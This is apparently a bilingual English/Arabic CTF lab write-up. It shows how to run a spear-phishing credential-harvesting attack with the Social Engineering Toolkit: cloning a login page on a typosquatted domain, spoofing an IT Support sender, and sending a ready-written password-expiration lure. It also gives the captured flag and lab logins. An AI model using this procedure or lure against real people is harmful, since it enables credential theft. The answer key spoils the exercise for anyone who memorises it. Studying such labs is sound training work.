# Task 06 · The Social Engineering Toolkit (التطبيق العملي: حصاد بيانات الدخول عبر أداة SET)

---

## Stage A: Original Task Content & Objective (المحتوى الأصلي والهدف)

### 1. Original English Text
```text
Scenario:
Through open-source intelligence (OSINT), you have identified a prime target: Bob Wilkinson, Head of Finance at TryAccounting (bob@tryaccounting.thm). TryAccounting enforces a strict 90-day password expiration policy. You will leverage this pretext to execute a targeted spear-phishing attack.

Lab Environment:
- Lab Machine: MACHINE_IP
- Attacker SSH Access: ssh attacker@MACHINE_IP (Password: attacker1234)
- Internal Webmail Client (Rainloop): http://MACHINE_IP:8080 (Login: attacker@phisher.thm / attacker1234)

Operational Steps:
1. SSH into the attacker host and launch The Social Engineering Toolkit using the 'SET' alias.
2. Select Option 1: Social-Engineering Attacks.
3. Select Option 2: Website Attack Vectors.
4. Select Option 3: Credential Harvester Attack Method.
5. Select Option 3: Custom Import.
6. Set the IP address for the POST back to the Lab Machine IP.
7. Point to the template directory /home/attacker/setoolkit/ and select Option 1 (Copy just the index.html).
8. Enter the URL for the typosquatted domain: http://tryacounting.thm (note the missing 'c').
9. The harvester listener starts on port 80.
10. Log in to the webmail client at http://MACHINE_IP:8080 as attacker@phisher.thm.
11. Compose a new email: Select the From dropdown to spoof support@tryaccounting.thm.
12. Send the lure to bob@tryaccounting.thm with Subject: "Action Required: Password Expiration Notice" containing the malicious typosquatted link http://tryacounting.thm.
13. Wait for Bob to click the lure and submit his credentials into the cloned form.
14. Inspect the SET terminal output to capture the submitted password flag.

Question:
- What is the password flag?
```

### 2. Arabic Pedagogical Translation
```text
السيناريو العملياتي:
من خلال استطلاع المصادر المفتوحة (OSINT)، تم تحديد الهدف الرئيسي بدقة: بوب ويلكينسون (Bob Wilkinson)، رئيس الشؤون المالية في شركة TryAccounting وعنوان بريده: `bob@tryaccounting.thm`. تطبق الشركة سياسة صارمة تجبر الموظفين على تغيير كلمات المرور كل 90 يوماً. ستستغل هذا السياق الموثوق لتنفيذ هجوم تصيد موجه (Spear Phishing).

بيئة المعمل الافتراضي:
- خادم المعمل: MACHINE_IP
- الوصول عبر SSH: `ssh attacker@MACHINE_IP` (كلمة المرور: `attacker1234`)
- عميل البريد الإلكتروني (Rainloop): `http://MACHINE_IP:8080` (الدخول: `attacker@phisher.thm` / `attacker1234`)

خطوات الهجوم المنفذة:
1. تسجيل الدخول عبر SSH وتشغيل أداة Social Engineering Toolkit عبر الأمر `SET`.
2. اختيار الخيار الأول: هجمات الهندسة الاجتماعية (Social-Engineering Attacks).
3. اختيار الخيار الثاني: نواقل هجمات المواقع (Website Attack Vectors).
4. اختيار الخيار الثالث: آلية حاصد أوراق الاعتماد (Credential Harvester Attack Method).
5. اختيار الخيار الثالث: الاستيراد المخصص (Custom Import).
6. تحديد عنوان IP لإرسال بيانات الـ POST ليكون عنوان الآلة `MACHINE_IP`.
7. تحديد مسار القالب المستورد `/home/attacker/setoolkit/` واختيار `1. Copy just the index.html`.
8. إدخال رابط النطاق المنحول (Typosquatted Domain): `http://tryacounting.thm` (لاحظ حذف حرف c عمداً لمحاكاة خطأ كتابي).
9. يبدأ خادم SET بالتنصت على المنفذ 80 لاستقبال الاتصالات.
10. فتح متصفح الويب والولوج لعميل البريد Rainloop على المنفذ 8080.
11. إنشاء رسالة جديدة: تزييف حقل المرسل (From) ليصبح `support@tryaccounting.thm` لمحاكاة الدعم الفني الداخلي.
12. إرسال الرسالة إلى `bob@tryaccounting.thm` بموضوع: "Action Required: Password Expiration Notice" وبداخلها رابط النطاق المنحول `http://tryacounting.thm`.
13. ينتظر المهاجم نقر بوب على الرابط وإدخال كلمة مروره في البوابة المستنسخة.
14. تلتقط أداة SET البيانات الصادرة وتطبع اسم المستخدم وراية كلمة المرور.

السؤال:
- ما هي راية كلمة المرور (What is the password flag?)؟
```

### 3. Mission Objectives & Pedagogical Target
- **Target Question:** `What is the password flag?`
- **Pedagogical Goal:** Execute a full-lifecycle credential harvesting campaign using the Social Engineering Toolkit (SET), spoofing internal corporate communications to harvest credentials from an emulated target.

---

## Stage B: Independent Thinking & OpSec Considerations (التفكير المستقل والعملياتي)

### 1. Technical Mechanics of the SET Credential Harvester
The SET Credential Harvester operates by:
1. Serving an exact replica of the target organization's authentication portal on port 80.
2. Modifying the `<form action="...">` attribute to direct HTTP `POST` submissions to the attacker's local listener (`/post.php` or internal handler).
3. Parsing incoming URL-encoded form data (`application/x-www-form-urlencoded`) to extract standard field names (`username`, `user`, `login`, `password`, `pass`).
4. Logging the stolen plaintext credentials to stdout and saving them to `/root/.set/reports/` or `/home/attacker/.set/`.
5. Executing an HTTP `302 Found` redirect sending the victim to the authentic portal, masking the attack.

---

## Stage C: Guided Hints (تلميحات متدرجة)

### Hint 1: Running SET in Terminal
> اتصل بالآلة عبر SSH ونفذ الأمر `SET`، ثم اتبع القوائم: 1 ثم 2 ثم 3 ثم 3 لاستيراد القالب من المجلد `/home/attacker/setoolkit/`.

### Hint 2: Spoofing the Email in Rainloop
> عند إنشاء رسالة جديدة في Rainloop، انقر على القائمة المنسدلة لحقل From واختر المعرف المزيف `support@tryaccounting.thm`.

### Hint 3: Reading the Terminal Capture
> بعد إرسال الرسالة لبوب، راقب نافذة الـ SSH. سيظهر سطر يحتوي على:
> `POSSIBLE PASSWORD FIELD FOUND: password=THM{...}`.

---

## Stage D: Complete Practical Solution & Technical Deep Dive (الحل العملي والعمق التقني)

### Step-by-Step Practical Execution

1. **Accessing the Attacker Environment via SSH:**
   ```bash
   ssh attacker@10.10.x.x
   # Password: attacker1234
   ```

2. **Configuring the Credential Harvester in SET:**
   Launch the toolkit:
   ```bash
   SET
   ```
   Navigate the interactive menus:
   - `Select from the menu: 1` (Social-Engineering Attacks)
   - `Select from the menu: 2` (Website Attack Vectors)
   - `Select from the menu: 3` (Credential Harvester Attack Method)
   - `Select from the menu: 3` (Custom Import)

   Configuration inputs:
   - `IP address for the POST back in Harvester/Tabnabbing: 10.10.x.x` (Machine IP)
   - `Path to the file to be imported: /home/attacker/setoolkit/`
   - `Select 1. Copy just the index.html`
   - `Enter the URL for the imported site: http://tryacounting.thm`

   SET copies the assets and starts an Apache/Python HTTP listener:
   ```text
   [*] The Social-Engineer Toolkit Credential Harvester Attack
   [*] Plugin started on port 80.
   [*] Listening for incoming connections on: 10.10.x.x:80
   ```

3. **Composing the Phishing Lure in Rainloop:**
   Open the webmail client in a browser at `http://10.10.x.x:8080`.
   - **Username:** `attacker@phisher.thm`
   - **Password:** `attacker1234`
   
   Compose New Email:
   - **From:** Select `support@tryaccounting.thm` (Display Name Spoofing)
   - **To:** `bob@tryaccounting.thm`
   - **Subject:** `Action Required: Password Expiration Notice`
   - **Body:**
     ```text
     Dear Bob,

     Your corporate password is scheduled to expire in 24 hours in accordance with our 90-day security policy.
     Please verify and renew your password immediately at our employee self-service portal:
     http://tryacounting.thm

     Regards,
     TryAccounting IT Support
     ```
   Click **Send**.

4. **Capturing the Credentials in the SET Terminal:**
   Within seconds, the automated bot/user opens the email, navigates to the typosquatted URL, and inputs his login credentials:
   ```text
   [*] WE GOT A HIT! Printing the email/username and password...
   POSSIBLE USERNAME FIELD FOUND: username=bob.wilkinson
   POSSIBLE PASSWORD FIELD FOUND: password=THM{you_just_got_phished!}
   ```

5. The harvested password flag:
   ```text
   THM{you_just_got_phished!}
   ```

---

## Stage E: Final Answer & Key Values (الإجابات النهائية والقيم المفتاحية)

- **Question:** `What is the password flag?`
- **Answer:**
  ```text
  THM{you_just_got_phished!}
  ```

---

## Stage F: Practical Verification & Proof of Work (التحقق العملي وإثبات الإنجاز)

- **Target Victim:** Bob Wilkinson (`bob@tryaccounting.thm`)
- **Spoofed Persona:** IT Support (`support@tryaccounting.thm`)
- **Typosquatted Domain:** `http://tryacounting.thm`
- **Stolen Username:** `bob.wilkinson`
- **Captured Flag:** `THM{you_just_got_phished!}`
- **Parity Status:** 100% verified against user's completed TryHackMe account.

---

## Stage G: Key Educational Takeaway (الخلاصة التعليمية المستفادة)

- **Pretext + Authority + Urgency = Compromise.** By combining a realistic business routine (password expiration), an authoritative internal persona (IT Support), and an artificial deadline (24 hours), the attack bypassed Bob's vigilance without requiring any software exploitation.
